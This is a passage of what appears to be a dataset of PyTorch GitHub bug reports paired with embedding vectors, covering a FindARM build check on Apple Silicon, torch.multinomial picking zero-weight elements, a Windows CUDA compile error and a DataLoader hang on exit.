 -3.65569264e-01 -1.03548110e-01 -2.44053721e-01 -3.78600419e-01
  3.11932880e-02  8.22529420e-02 -9.85493064e-02 -1.31402284e-01
 -1.86390698e-01 -3.83814387e-02 -2.86535084e-01  7.14369938e-02
 -1.52353361e-01  2.70612568e-01  1.53697431e-01 -3.09480339e-01
  4.40547109e-01 -4.87718210e-02 -4.41634297e-01 -1.57774046e-01
 -1.64532289e-01 -1.98172912e-01  2.38640653e-03  4.34076302e-02
  6.35397658e-02 -1.78056777e-01 -1.82912767e-01  3.91416132e-01
  4.36898082e-01 -2.42922368e-04  5.40175378e-01  1.33212628e-02
  2.28799403e-01 -1.15890875e-01  1.98051274e-01  1.81210622e-01
 -7.92746916e-02  4.00079824e-02  2.77860075e-01  1.03769578e-01
 -1.76917732e-01 -3.47389989e-02  2.33643502e-01  7.15766922e-02
 -5.35050072e-02 -7.74518913e-03 -1.27301082e-01 -3.85836558e-03
  7.92964175e-02 -1.34528026e-01 -1.21927567e-01  3.49708885e-01
  2.51696199e-01  2.37100780e-01 -2.35774010e-01 -2.69992054e-02
 -1.32970229e-01 -3.84883791e-01  3.17113280e-01 -4.10629362e-01
  1.22269690e-01  8.54155421e-02  5.95071679e-03  2.32245982e-01
 -1.36339977e-01  2.19959080e-01 -5.22460341e-02 -5.41124120e-02
  3.59020025e-01  2.06771761e-01  3.59209068e-02  3.23435634e-01
  3.10122699e-01  2.95552045e-01 -3.89865249e-01  6.21072911e-02
 -2.55583853e-01 -3.92465405e-02  3.86991948e-02 -1.59352899e-01
 -5.27116731e-02 -1.34342492e-01  5.58449067e-02  1.75373368e-02
  4.19274777e-01 -1.06154069e-01  1.19466551e-01 -1.61305964e-01
 -1.54405400e-01 -3.61808449e-01 -3.06975283e-02  5.01517415e-01
  4.65915203e-01 -2.01453447e-01 -2.02669594e-02 -3.27936918e-01
  2.11298406e-01 -2.49973878e-01 -3.88709605e-01  6.01425171e-01
  4.58414406e-01 -1.08523719e-01 -6.70160353e-02  8.71857777e-02
  7.61697814e-02  1.26379147e-01 -2.26718374e-02 -2.35213280e-01
 -5.99113345e-01 -3.31467867e-01  4.86312397e-02 -2.72990286e-01
 -1.24647580e-01 -2.74339497e-01  1.25267565e-01  3.26182812e-01
 -4.43154052e-02  7.71528557e-02  2.40099236e-01 -3.51334326e-02
 -1.06794789e-01  1.97910443e-01  2.91554965e-02  1.02701951e-02
  6.81934208e-02  3.30667347e-02 -1.54895470e-01  2.52429396e-01
 -3.36656213e-01 -4.98638719e-01 -1.04026608e-01 -5.60319647e-02
  2.57144034e-01  1.56397130e-02 -5.96462905e-01  1.14489347e-01
 -1.53081179e-01 -3.18375900e-02  1.63390875e-01  7.68728033e-02
 -3.99596505e-02  5.64652542e-03 -2.39583552e-01  3.41167092e-01
 -1.63980320e-01 -2.55068168e-02  6.43747225e-02 -1.64195836e-01
 -9.58746225e-02  9.60379615e-02 -6.15718178e-02 -7.56606087e-02
 -1.31225258e-01 -4.10464518e-02  3.46531421e-01  1.32060081e-01
  1.54058486e-01 -1.76246949e-02 -1.83636576e-01  1.92314520e-01
 -1.98111773e-01 -2.60039896e-01  3.07691753e-01  6.53900385e-01
  5.13506830e-01 -1.02480426e-01  3.25474024e-01 -7.76472688e-02
 -1.50520146e-01 -3.08798343e-01 -4.84286472e-02 -4.40503545e-02
 -7.17118457e-02 -3.70919704e-02  1.48630425e-01  7.83645082e-03
  3.71807903e-01 -5.85677437e-02 -4.12101567e-01 -1.12635121e-01
 -1.21769151e-02  3.01177144e-01  4.02652264e-01 -2.07672447e-01
  8.73170495e-02 -1.07670657e-01  7.01285573e-03  2.66265571e-01
  1.92912892e-01 -2.33113170e-01  2.29596630e-01 -5.15094139e-02]"
Checking the hw.optional.arm64 sysctl prevents Apple Silicon from building a universal binary module: build triaged,"This check https://github.com/pytorch/pytorch/blob/e7ca62be08f96b07efc1271baf9b02d4e7be226a/cmake/Modules/FindARM.cmake#L44-L45 prevents an Apple Silicon Mac from building an x86_64 variant of Pytorch.

I'm sure the check exists because folks are installing CMake as an x86_64 binary from homebrew, so they want to use it to pick a different architecture from the CMake architecture, however this is how I got here:

I built and installed both CMake and ninja as Universal 2 binaries.
I built Python 3.9.1rc1 as x86_64 using `arch -x86_64`  before the Python configure/make commands.

When I run this x86_64 Python, it runs the x86_64 CMake binary, which is actually correct in this case (unlike the case where you only have an x86_64 CMake binary, so arm64 processes drop to x86_64 and you need the sysctl).

With `CMAKE_SYSTEM_PROCESSOR=x86_64 CMAKE_OSX_ARCHITECTURES=x86_64 python3.9 setup.py build` and a small fix to CMake itself (upstream issue here https://gitlab.kitware.com/cmake/cmake/-/issues/21554), I am able to convince Pytorch to build as x86_64 on this machine.

However, it breaks partway through the build due to the NEON definitions that are enabled by the issue I'm describing here.

If I remove the sysctl check in FindARM, an x86_64 build completes successfully on an M1, which I was able to manually `lipo` to make a fully universal2 pytorch package.

cc @malfet @seemethere @walterddr",True,"[-0.01016934  0.00095364 -0.09790856  0.14387366  0.06753196 -0.3743506
 -0.16263896  0.02521332 -0.47223315 -0.36037242  0.20716958 -0.16005
 -0.3275163  -0.3475495  -0.20802632 -0.15053177 -0.19141662 -0.30284065
  0.09335934 -0.02096472  0.02090421 -0.05477087 -0.04780339 -0.09821659
 -0.04078967 -0.0943584   0.4976809   0.04066819 -0.2127463   0.37019545
  0.4885369   0.26815873  0.33089328  0.1602844   0.36747983 -0.13212097
  0.31160146 -0.51223993 -0.0440867  -0.2480578  -0.17821899  0.40506783
  0.1960026   0.45359445  0.08266419 -0.02499128 -0.01261869 -0.08800432
 -0.17398502 -0.2823553   0.34571868 -0.18197477  0.2488862  -0.37569088
  0.06139028 -0.17098922  0.02768997  0.40596676  0.22894335  0.37663212
  0.3562823  -0.4198538   0.22112489 -0.09507638  0.08463975  0.44669116
  0.03558886 -0.27987814  0.10884641  0.03122679 -0.06451759  0.0262808
 -0.26438358  0.06399567  0.47340262  0.18908668 -0.2718949  -0.20445853
  0.05312071 -0.11011513 -0.36898774 -0.23835376 -0.0313725   0.20215839
  0.0572379  -0.01934054 -0.30235434  0.0261851   0.00327492 -0.1546168
  0.12403106 -0.3069776  -0.12754217 -0.04519214  0.04727209 -0.03551905
  0.19051386 -0.12866819 -0.09823522 -0.13064365 -0.1980498  -0.30240372
 -0.31414837 -0.02604626 -0.16801363 -0.5698893   0.3433221   0.47386914
  0.11544184 -0.13820377  0.221365    0.27725142 -0.01788224  0.17584401
  0.19718741 -0.07630806 -0.14327039  0.22598612  0.04183634 -0.041349
  0.08322324 -0.12769482 -0.22555235 -0.14530295 -0.12640631 -0.35329148
 -0.5146901   0.42801183 -0.05421625  0.12556306  0.07996507 -0.10384402
  0.47346818 -0.35405326  0.15333796  0.04454612 -0.03356715 -0.30162385
 -0.07071719 -0.3397298  -0.12080748  0.2554534   0.24011582 -0.19535637
 -0.16937467 -0.14006558 -0.07168829  0.3109267  -0.07216009 -0.06010524
  0.0847799  -0.1714637   0.27233055  0.5295949   0.34724897  0.06287716
  0.19845566 -0.08463041 -0.21982849  0.01214239 -0.03599711  0.42520577
  0.04797482  0.06266315  0.02891808  0.0542608  -0.2339818  -0.01435195
  0.06830022  0.08998064  0.05828409  0.04246392  0.4825259  -0.16924539
 -0.27670544 -0.2831501   0.33409816 -0.04333899 -0.04929783  0.17419744
  0.13200161  0.00174053  0.4506213  -0.11817523  0.17006643  0.4328045
 -0.14601783  0.44355047  0.18995242  0.07833864 -0.07491766  0.51940686
 -0.2459154   0.05165922  0.03974996 -0.25561452 -0.3729232   0.37672722
 -0.127274    0.15460086  0.14508042 -0.00814435 -0.15914688  0.07184185
  0.04685046  0.0395965  -0.43525934 -0.21202797  0.05628416  0.05337618
 -0.16253792 -0.22741348 -0.4251375   0.21698011 -0.26720503  0.00780867
  0.10059018  0.0095514   0.15054502 -0.01402511 -0.22394279 -0.27509844
 -0.5188021  -0.4179191   0.0640647  -0.22705543  0.15870072 -0.20061502
 -0.2991963   0.10999881  0.02267409 -0.16059601  0.00235197 -0.18517578
  0.672101    0.10367006 -0.28148347 -0.38095313 -0.02032599  0.66651374
 -0.15098035  0.09260626 -0.2585918  -0.0585722   0.20892844  0.20285225
  0.0694038  -0.1507774   0.32420617 -0.07500121 -0.04546238  0.02117399
  0.1942567   0.04902882  0.14114667 -0.07055272  0.20348796  0.1822954
  0.00308211 -0.3519945   0.15252973  0.18427475  0.11384464  0.14794207
  0.08921799  0.05628658 -0.271127    0.3548416   0.01093976  0.2043328
  0.30580932 -0.2585999   0.2636885  -0.13727078  0.33318636 -0.0309204
  0.36145502 -0.3049578  -0.18441156  0.35007632 -0.18114796  0.35031766
  0.28949228  0.0335273   0.36149395 -0.18300614  0.52715963 -0.311916
 -0.4125626  -0.1553293   0.02816895  0.51914126  0.33302203  0.12958533
  0.141491    0.34013674  0.02313328  0.1368407  -0.11254499  0.12129238
 -0.23150106 -0.04435782 -0.53988     0.13041139 -0.2671787   0.28486055
 -0.15121354  0.10634144  0.62251204 -0.36856484  0.01846126  0.3009238
  0.12361471  0.21344282 -0.2006687  -0.02056829 -0.27316624  0.35392767
 -0.04042637 -0.06308642 -0.05063708 -0.3021568  -0.30725077 -0.00276709
  0.23934838  0.17960893 -0.42755398 -0.30200738  0.13315165 -0.12145682
 -0.08939574 -0.03320554 -0.43087938  0.24970531 -0.1543343   0.19181421
 -0.27293792  0.05273819  0.045189   -0.19025126 -0.3192441  -0.13419917
  0.19966625  0.07641625 -0.07674179  0.14479929 -0.01050102  0.2589813
 -0.12093024 -0.2070615  -0.32643068 -0.00352414 -0.26354864  0.00129101
 -0.06921225  0.33514112 -0.2667366   0.18713221  0.48637292  0.26755583
 -0.4777927  -0.37206697 -0.5654279   0.24126565 -0.00593926 -0.12288741
 -0.17760618  0.15853882 -0.02230657  0.41635108  0.03019509  0.19701481
 -0.06631128  0.03867374 -0.01017132 -0.01696593  0.04962789 -0.17639032
 -0.15676418  0.18609971  0.17968723  0.02248126  0.30080935  0.11024839]"
torch.multinomial selects elements with zero weight high priority triage review module: binaries module: distributions triaged module: random,"## ðŸ› Bug

torch.multinomial sometimes selects elements with zero weight.

## To Reproduce

When I run this code, element 0 is often selected within 200 iterations on CPU and within 1000 iterations on CUDA:

```
for i in range(10000):
    print(i)
    probabilities = torch.zeros(100000, 2)
    probabilities[:, 1] = 1.0
    result = torch.multinomial(probabilities, num_samples=1)[:, 0]
    assert (result == 1).all()
```

## Expected behavior

An element with weight 0 is never selected.

## Environment

PyTorch version: 1.7.0+cu101
Is debug build: True
CUDA used to build PyTorch: 10.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: version 3.18.2

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: Quadro GV100
Nvidia driver version: Could not collect
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.0.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] torch==1.7.0+cu101
[conda] blas                      1.0                         mkl
[conda] mkl                       2020.2                      256
[conda] mkl-include               2020.2                      256
[conda] mkl-service               2.3.0            py38he904b0f_0
[conda] mkl_fft                   1.2.0            py38h23d657b_0
[conda] mkl_random                1.1.1            py38h0573a6f_0
[conda] numpy                     1.19.1           py38hbc911f0_0
[conda] numpy-base                1.19.1           py38hfa32c7d_0
[conda] torch                     1.8.0a0                  pypi_0    pypi

## Additional context
See also https://github.com/pytorch/pytorch/issues/4858 and https://github.com/pytorch/pytorch/issues/13867

Many thanks for all your work on PyTorch! I find it very useful.



cc @ezyang @gchanan @zou3519 @seemethere @malfet @fritzo @neerajprad @alicanb @nikitaved @pbelevich @bdhirsh @jbschlosser @walterddr",True,"[-0.41511375  0.27019826 -0.09225997 -0.10136084 -0.07170765 -0.11347894
  0.03498193  0.16880357 -0.2957331  -0.06470452 -0.08298237 -0.26682562
 -0.144623    0.14591795 -0.0970549  -0.02443615 -0.1636186  -0.41986382
 -0.0951582   0.07282472  0.35220617 -0.06868251 -0.26640013 -0.08526343
  0.17666565 -0.03776567 -0.25670448 -0.00601564  0.38224626 -0.11840827
  0.11221184  0.06367794 -0.07729189 -0.06720995  0.27877647 -0.31476045
 -0.36067364  0.08770438 -0.11389516  0.14410917  0.1360856   0.15414226
 -0.09685448 -0.00507272 -0.0415302   0.04713651 -0.35199368  0.36471188
 -0.13743322  0.14945567 -0.01433464  0.21855673  0.04715257  0.03436527
  0.03501423 -0.32140964 -0.27027678 -0.34334272 -0.12430857 -0.35185093
  0.39918244  0.19048968 -0.16548818 -0.25327432  0.4706754   0.19507273
 -0.12019311  0.04511667  0.40124625  0.10345367 -0.06186706  0.07346453
  0.03325325 -0.22623642 -0.18998532  0.09260602 -0.34355676  0.12969019
 -0.311076   -0.07240803 -0.07448354 -0.00258662 -0.16740885 -0.31205118
 -0.07639071  0.00091841  0.41650623  0.08891907  0.2592113   0.30986276
 -0.25556067  0.34651834  0.05965503  0.35067803 -0.30426854  0.3521899
 -0.01316633 -0.50010383 -0.22063094 -0.03340606  0.00245368 -0.42569357
 -0.16188788  0.29078245 -0.09554863 -0.33421442  0.12332033  0.22512916
  0.22135729  0.01131472  0.2451883   0.26928696 -0.04948598  0.08399513
 -0.09467077 -0.33231694  0.2654418   0.03188894  0.02049593  0.20324744
  0.04595753 -0.01655095  0.32065007 -0.02323382  0.31954017  0.14490874
  0.13978583 -0.10719545 -0.07763951  0.06623644  0.1174233   0.01467064
  0.1824191  -0.07393281  0.07020074  0.31846467 -0.21074092 -0.07546136
 -0.09688206  0.22217092  0.04348538  0.12026159 -0.06940114 -0.11601377
  0.1388691  -0.05379225 -0.03472757 -0.01759865  0.0438628  -0.07159096
 -0.00645645 -0.27765006 -0.29353803  0.27399838  0.12300645 -0.29860318
 -0.01143344  0.13813305  0.24886352  0.00693595  0.05591867  0.05259803
  0.16560934 -0.02218869  0.11964434  0.20599777 -0.07433823  0.15018946
 -0.43194336  0.15693402  0.04079676 -0.22878352 -0.13187577 -0.21306808
  0.24966244 -0.34482563 -0.37717348 -0.23729041 -0.15618362  0.10089064
  0.21983546  0.44500822  0.3109806   0.0865254   0.09885521 -0.08963849
  0.38241714  0.14547104 -0.3054806  -0.1098686  -0.3211858  -0.10632307
  0.03879509  0.12282613 -0.01641374 -0.24507701 -0.07762143 -0.0619815
  0.04331958 -0.12246837  0.09694704  0.02770733 -0.07106273 -0.02041494
  0.16102253  0.18150628 -0.36578748 -0.25950646  0.05693499  0.06053775
 -0.10948372 -0.35439816 -0.05563077 -0.11677956  0.05931883  0.31484917
 -0.25944358 -0.11208399  0.13148054  0.28812623  0.6176915  -0.10175893
  0.01470936 -0.16271783 -0.04442463 -0.00189646 -0.15860134 -0.1040324
  0.20484203 -0.11579356 -0.02370661 -0.11114641  0.02881391  0.02071585
  0.04732133  0.28895652 -0.06059866 -0.08040164 -0.07017718  0.1024093
 -0.17380115 -0.17439455  0.20804511 -0.06517978  0.01867904  0.32967287
 -0.41706502 -0.01288841 -0.03781617 -0.13942716 -0.03186093 -0.07815628
  0.00885226 -0.33911717  0.08001021  0.08288556  0.28630316 -0.06858882
  0.00678662 -0.22937432  0.14683963  0.22259727  0.02165412  0.17402329
  0.37924072 -0.03207415 -0.07195009  0.07001439 -0.0461039  -0.27469766
  0.1610449  -0.448811    0.4332735   0.14444467  0.27384627 -0.11179588
  0.1039307   0.03846009  0.1097623  -0.2963892   0.07510182  0.1888676
  0.07711316  0.19593027  0.03199089 -0.4923535   0.14384575  0.12762992
 -0.0877666  -0.14689198  0.09957622  0.07414021  0.38648653 -0.16157533
 -0.2511437   0.15390685  0.09963582 -0.2961731   0.18112728  0.01518517
 -0.14382747  0.19441466  0.36530483 -0.13998212 -0.42411596  0.09339297
 -0.1352843   0.09445349  0.54677165 -0.40555453  0.308717   -0.09115735
 -0.17399007  0.3067151  -0.14320754  0.22228041 -0.11668951 -0.10212895
 -0.09418243  0.11872875  0.27376312 -0.29315525 -0.24300553  0.21241474
  0.06497434  0.3449631  -0.36729044 -0.0166581   0.11470922  0.17068872
  0.43701434  0.04792347  0.31971937  0.13388947 -0.19906318 -0.26772648
 -0.17373216  0.25363716 -0.022782   -0.24060535 -0.28373793 -0.10576622
  0.01895175 -0.10586476  0.15609324  0.04305205  0.16810122 -0.07128069
 -0.13980976 -0.01758803 -0.20860878 -0.1940902  -0.01106633  0.1354034
  0.09593458  0.10970194  0.23715225  0.29487556  0.10362455  0.03098478
 -0.03448889 -0.07476176 -0.40661308  0.09347691 -0.0417764  -0.2532896
 -0.20839389 -0.33394033  0.09719647  0.2472627  -0.01287589  0.14672327
  0.2759329   0.02364835  0.20351937 -0.06725569  0.21127455 -0.12355611
  0.12666914  0.20462136  0.41600746 -0.21768573 -0.34271038 -0.09252986]"
"error: a member of type ""const c10::Symbol"" cannot have an in-class initializer on Windows module: build module: windows triaged","## ðŸ› Bug

PR #48717 replaced `constexpr` with `CONSTEXPR_EXCEPT_WIN_CUDA` to resolve some of the problems on CUDA+Windows for TorchVision as discussed at pytorch/vision#3051. Unfortunately we continue having issues:
```
C:/Users/circleci/project/env/lib/site-packages/torch/include\torch/csrc/jit/ir/ir.h(1329): error: a member of type ""const c10::Symbol"" cannot have an in-class initializer

C:/Users/circleci/project/env/lib/site-packages/torch/include\torch/csrc/jit/ir/ir.h(1349): error: a member of type ""const c10::Symbol"" cannot have an in-class initializer
```

I believe we need to move the initialization outside of the class on the following two places:
https://github.com/pytorch/pytorch/blob/0484b048d050ea5b10cb0efd147148aa893f2a4b/torch/csrc/jit/ir/ir.h#L1329
https://github.com/pytorch/pytorch/blob/0484b048d050ea5b10cb0efd147148aa893f2a4b/torch/csrc/jit/ir/ir.h#L1349

cc @malfet @seemethere @walterddr @peterjc123 @maxluk @nbcsm @guyang3532 @gunandrose4u @mszhanyi @skyline75489 @ezyang
",True,"[-2.90583789e-01  1.34958819e-01 -1.21160492e-01  2.48777181e-01
  6.94353804e-02 -4.36429530e-02 -1.41610920e-01  2.22265929e-01
 -4.15451169e-01 -5.72219025e-04 -2.45124400e-01 -1.06321238e-01
 -2.54123509e-01 -2.29499221e-01  7.87852705e-02  8.35830271e-02
 -2.01878697e-01  2.29183864e-02 -9.85841267e-04  9.73698348e-02
 -2.18698397e-01 -1.17497705e-02 -3.21122229e-01 -1.95328370e-01
  2.18660831e-01  8.03451911e-02 -1.20058551e-01  3.74537800e-03
  3.13840926e-01  1.30972534e-01 -1.97338127e-02 -3.80963571e-02
  1.31677166e-02  3.48373890e-01  9.97718871e-02 -1.09558821e-01
 -1.04279786e-01 -7.46521028e-03 -2.15598151e-01 -2.10807323e-01
  1.18647151e-01  1.26740858e-01 -2.93336332e-01  2.10038438e-01
 -8.69063437e-02 -9.93661880e-02  1.15699664e-01  1.48820460e-01
 -2.44726971e-01 -2.83693731e-01 -1.49247944e-01  1.67866237e-04
  1.27594426e-01  1.59965158e-01  1.73087314e-01 -3.50713789e-01
 -4.24585521e-01  1.68209821e-01  3.96960407e-01 -4.30904835e-01
  8.73523131e-02 -2.43208960e-01  1.84711650e-01 -2.86631793e-01
 -3.85781713e-02 -2.40425840e-02 -1.27524748e-01  4.16508675e-01
  4.36869681e-01 -1.75919652e-01  2.22566262e-01  2.38270447e-01
  1.44584030e-01 -2.01535419e-01 -5.94606437e-03 -2.40056187e-01
 -4.19701397e-01  2.06495881e-01 -1.88961655e-01 -1.75091565e-01
  2.69229293e-01  1.27194345e-01 -9.79920477e-02  1.58858508e-01
  3.37917000e-01 -1.69319764e-01 -4.19584662e-02 -2.38693327e-01
  1.78045258e-01  1.19094238e-01  9.20157582e-02 -2.32029129e-02
  1.46338105e-01  5.03895402e-01 -1.52494669e-01 -5.22724465e-02
  2.55625546e-01  9.53090787e-02 -2.87859917e-01 -3.34733367e-01
 -1.86548397e-01 -3.48102242e-01  8.14107060e-03  5.65278172e-01
  1.78567674e-02 -5.03227711e-01  4.48469102e-01  3.74681711e-01
 -2.28279740e-01 -4.39279139e-01  4.04714346e-01 -9.30027887e-02
 -1.46007627e-01 -3.05532396e-01 -6.67059273e-02 -1.05188787e-01
 -3.57830733e-01 -1.41870618e-01 -1.05925035e-02 -1.96127743e-01
  1.33756220e-01  2.20961407e-01 -2.76422203e-02  2.21702293e-01
  1.36561260e-01  1.40959918e-01 -3.28237146e-01 -5.54790907e-02
 -2.14273065e-01  3.66702378e-01 -2.30988860e-01  1.75272584e-01
  2.67634720e-01 -1.23067603e-01  4.61695015e-01  3.05674255e-01
 -5.41629732e-01 -8.77759606e-02 -8.57263058e-02 -3.26404989e-01
  2.86040157e-02  2.64762968e-01 -1.73022375e-01 -4.53221560e-01
  2.75896490e-01 -3.39651674e-01 -3.03536594e-01  1.00826593e-02
  5.23925647e-02  2.72563636e-01 -2.00157285e-01  1.33693933e-01
 -6.39849067e-01  4.93317485e-01  1.25793040e-01  1.50692135e-01
  1.92175284e-01 -2.55573578e-02  1.76556483e-01 -2.16567189e-01
  5.26692271e-01  4.45856988e-01  2.69345760e-01  3.06279123e-01
  3.05624157e-01 -4.01003174e-02 -2.30082631e-01 -2.02000111e-01
 -8.21457803e-02  1.55088931e-01 -9.58632529e-02 -6.66859597e-02
  2.13647991e-01 -2.52775073e-01  3.25573146e-01 -2.38884270e-01
  9.80162993e-02 -9.65358466e-02  1.03829419e-02  7.06807137e-01
  4.58029389e-01  4.69372213e-01  3.63722742e-01 -3.53675634e-02
  3.16851512e-02  2.54150927e-01  2.11695969e-01 -1.84819140e-02
 -1.06186777e-01 -5.71088418e-02 -4.48244601e-01 -4.31237631e-02
 -3.95878367e-02 -1.40532896e-01 -4.02371138e-02  8.94493312e-02
 -3.84329297e-02  5.05931713e-02 -1.32599935e-01  4.78063850e-03
 -9.36429948e-02  4.97492909e-01  1.02721810e-01  7.50982910e-02
  3.32723930e-02  3.42450887e-02 -3.84824634e-01 -2.79663891e-01
 -4.04837102e-01 -4.15912233e-02 -1.12504505e-01  7.50135481e-02
 -1.05853334e-01 -5.55158481e-02 -5.77785727e-03  4.57435429e-01
 -3.29065435e-02 -2.54483700e-01 -6.72820024e-03  2.66668767e-01
  4.21266347e-01  3.92344072e-02  6.34939969e-03 -1.93469018e-01
  4.97309834e-01 -2.04005092e-03  1.17254220e-02 -2.41820693e-01
 -1.62242591e-01  2.28449851e-01 -1.82190523e-01 -7.34905899e-01
  1.54416248e-01 -2.47297570e-01  4.49243665e-01  2.27669805e-01
  5.27981557e-02 -1.57358542e-01 -1.23120397e-01  1.86894149e-01
 -3.80717039e-01 -3.31312478e-01  2.73017101e-02 -3.71994287e-01
  9.77222715e-03  4.94543910e-02 -1.31265536e-01 -2.65952647e-01
 -2.49413133e-01  1.00260139e-01  5.07072687e-01 -4.31771129e-02
 -8.48642141e-02 -1.86082602e-01  1.78006798e-01  6.61902502e-02
  2.18436539e-01 -5.55889308e-02 -2.20687598e-01 -5.48274815e-02
 -8.44112635e-02  8.85802209e-02 -8.53259191e-02 -7.34084696e-02
  1.92940593e-01  7.01783365e-03  5.86619377e-02  4.47350025e-01
 -1.90062508e-01  1.03633150e-01  3.97637129e-01 -2.81727135e-01
  4.45378035e-01 -3.03248018e-02  1.42211735e-01 -9.78694409e-02
  2.71321893e-01 -2.39048988e-01  2.37846315e-01 -3.47327232e-01
  2.23303050e-01  2.91863173e-01  1.24719195e-01  2.07709700e-01
  8.75941873e-01 -2.13552386e-01 -2.38112524e-01 -3.50221276e-01
 -1.65988691e-02 -2.20974877e-01 -1.55863225e-01 -1.11651048e-01
  4.16210890e-01  1.19549595e-03 -2.93823481e-01  1.13460481e-01
 -9.62351859e-02 -8.18147212e-02 -7.89937526e-02  1.33586913e-01
 -2.52921134e-01  2.82812595e-01  2.17032969e-01 -2.62379169e-01
 -4.41098839e-01 -3.20729017e-01  1.70679949e-02 -1.18207514e-01
  6.72578573e-01 -3.02007794e-01  2.22379807e-03  2.99474388e-01
 -3.06736141e-01  4.53637123e-01 -1.14493988e-01 -7.50392079e-02
  1.09465256e-01  6.44309223e-02 -1.57053411e-01 -4.80118878e-02
 -2.29975015e-01 -4.11083758e-01 -6.07870340e-01 -2.23531798e-01
  1.31369680e-01  1.62032664e-01 -5.61936617e-01  5.89664020e-02
 -1.70154527e-01  2.59026945e-01  6.18800707e-02  7.34225139e-02
  1.23765901e-01  1.02438971e-01 -3.20719540e-01 -2.25560695e-01
  2.71353014e-02  4.17269588e-01  1.31236270e-01 -2.23653585e-01
 -2.29688585e-01 -5.55625893e-02 -2.71727443e-02 -2.59839892e-01
 -3.99406195e-01 -2.56819069e-01 -7.26883262e-02  2.10005611e-01
  1.69992968e-01  5.13842180e-02 -2.39547089e-01  6.17872365e-02
  2.46974111e-01  8.19172263e-02 -2.80319899e-03  4.56973881e-01
  3.30287144e-02  2.61025220e-01  2.99552120e-02  1.10025279e-01
  4.17551398e-01  2.32880279e-01 -2.86021292e-01 -2.04725087e-01
 -2.87459999e-01  2.06153393e-01 -7.56390840e-02  3.26863378e-02
 -8.32953453e-02  3.16278100e-01 -2.56054759e-01  2.42931187e-01
  4.17141654e-02  1.77333340e-01  1.13497391e-01  2.24713609e-01
  1.40500769e-01  1.38640612e-01  1.67961180e-01  2.98497438e-01
  1.11245781e-01 -2.98569314e-02 -3.38103473e-01  1.38014957e-01]"
[dataloader] hang on python exit when has iter ref and sampler yields large indices module: dataloader triaged,"## ðŸ› Bug

Using the DataLoader causes the main process to hang on exit waiting to join the indices queue putting thread when the sampler is large (e.g., when `batch_size` is large) and a reference to the iterator is kept around (e.g., when `persistent_workers=True`). For instance, see the following simple script:

```py
import torch

class Dataset(torch.utils.data.Dataset):
    def __len__(self):
        return 10000000

    def __getitem__(self, any):
        return torch.empty(0)

if __name__ == '__main__':
    dl = torch.utils.data.DataLoader(
        Dataset(),
        batch_size=40960,
        num_workers=1)

    it = iter(dl)

    for i, x in enumerate(it):
        print(x.shape)
        raise RuntimeError()
```

Running the above in the below environment (pretty standard) will hang at exiting. Some probing suggests that this is due to the main process try to join the `_index_queues`. And, **due to** the iterator being around, the ordering of python atexit calls decides to call the `multiprocessing.Queue` clean-up (which joins the queue putting thread) before cleaning up `_MultiprocessingDataLoaderIter.__del__` (which would clean-up nicely). 

Finally, since the above uses a sampler with *large* indices sent to workers at each time (constructed by the dataloader using a `RandomSampler` wrapped in a `BatchSampler`), the putting thread is hanging waiting for more room in the pipe. The stderr will hang at 
```py
torch.Size([40960, 0])
Traceback (most recent call last):
  File ""XXXX/test.py"", line 34, in <module>
    raise RuntimeError()
RuntimeError
```

NB: the worker yields empty tensors, and thus its putter thread shouldn't be the reason of hanging.


To confirm that this also happens with a simpler sampler, the following script with disabled auto-batching hangs similarly:
```py
import torch


class BigSampler(object):
    def __iter__(self):
        for idx in range(20):
            yield [idx for idx in range(40960)]


class Dataset(torch.utils.data.Dataset):

    def __init__(self):
        self.first_time = True

    def __len__(self):
        return 10000000

    def __getitem__(self, indices):
        # NB: this is called *once* per dataloader fetch since we disabled auto-batching!
        if not self.first_time:
            # simulate some work so that the index_queue is likely non-empty 
            # (and thus the main process's queue putting is waiting). 
            import time
            time.sleep(0.1)
        self.first_time = False
        return torch.empty(0)


if __name__ == '__main__':
    dl = torch.utils.data.DataLoader(
        Dataset(),
        batch_size=None,
        sampler=BigSampler(),
        num_workers=1)

    it = iter(dl)

    for i, x in enumerate(it):
        print(x.shape)
        raise RuntimeError()
```

## Environment
```
PyTorch version: 1.7.0
Is debug build: True
CUDA used to build PyTorch: 10.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 16.04.7 LTS (x86_64)
GCC version: Could not collect
Clang version: Could not collect
CMake version: version 3.14.0

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: TITAN V
GPU 1: TITAN V
GPU 2: TITAN V
GPU 3: TITAN V

Nvidia driver version: 455.23.05
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip] numpy==1.17.2
[pip] torch==1.7.0
[pip] torchaudio==0.7.0a0+ac17b64
[pip] torchfile==0.1.0
[pip] torchvision==0.8.1
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               10.1.243             h6bb024c_0
[conda] mkl                       2019.4                      243
[conda] mkl-include               2019.4                      243
[conda] mkl-service               2.3.0            py37he904b0f_0
[conda] mkl_fft                   1.2.0            py37h23d657b_0
[conda] mkl_random                1.1.0            py37hd6b4f25_0
[conda] numpy                     1.16.0                   pypi_0    pypi
[conda] numpy-base                1.17.2           py37hde5b4d6_0
[conda] pytorch                   1.7.0           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torch                     1.3.0                    pypi_0    pypi
[conda] torchaudio                0.7.0                      py37    pytorch
[conda] torchfile                 0.1.0                    pypi_0    pypi
[conda] torchvision               0.6.0a0+35d732a          pypi_0    pypi
```


cc @SsnL @VitalyFedyunin @ejguan",True,"[-0.02059324 -0.30304915 -0.28190193 -0.13272323  0.30407935 -0.47008273
